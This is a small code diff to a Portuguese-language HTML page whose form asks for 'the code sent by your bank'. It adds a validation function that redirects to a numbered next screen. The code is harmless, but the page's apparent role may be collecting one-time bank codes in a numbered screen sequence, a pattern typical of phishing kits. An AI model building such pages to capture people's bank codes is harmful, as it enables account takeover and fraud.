@@ -24,7 +24,7 @@
 		
 		<!-- Lado direito com o formulário -->
 		<div class="right-side d-flex flex-column justify-content-center align-items-center w-100 p-4">
-			<form id="code-form" class="w-100" style="max-width: 450px;">
+			<form id="code-form" class="w-100" style="max-width: 450px;" onsubmit="return validateCode(event)">
 				<div class="mb-4 text-center">
 					<h4 class="fw-bold">Por favor, digite o código enviado pelo seu banco</h4>
 					<p class="text-muted">Ex: 000.000</p>
@@ -41,5 +41,20 @@
 	
 	<!-- Custom JavaScript -->
 	<script src="../assets/js/tela6_js.js"></script>
+	<script>
+		function validateCode(event) {
+			event.preventDefault();
+			const codigo = document.getElementById('codigo').value.trim();
+
+			if (!codigo) {
+				alert('Por favor, insira o código.');
+				return false;
+			}
+
+			// Redirect to the next page if validation passes
+			window.location.href = 'tela7.html';
+			return true;
+		}
+	</script>
 </body>
 </html>
